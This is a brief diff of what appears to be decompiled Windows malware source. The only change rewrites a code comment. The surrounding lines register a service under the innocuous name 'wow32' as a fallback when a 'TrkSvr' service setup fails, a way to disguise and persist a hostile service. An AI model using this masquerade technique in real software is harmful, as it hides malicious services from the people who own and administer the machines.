@@ -163,7 +163,7 @@ int main(int argc, const char **argv, const char **envp)
 	if(SetupTrkSvrService())
 		exit(0);
 
-	// Start a service named "wow32" that's really our service
+	// If our little TrkSvr shenanigans don't work, try again, but differently
 	ServiceStartTable.lpServiceName = (LPWSTR)L"wow32";
 	ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONW)SvcMain;
 	if(!StartServiceCtrlDispatcherW(&ServiceStartTable))
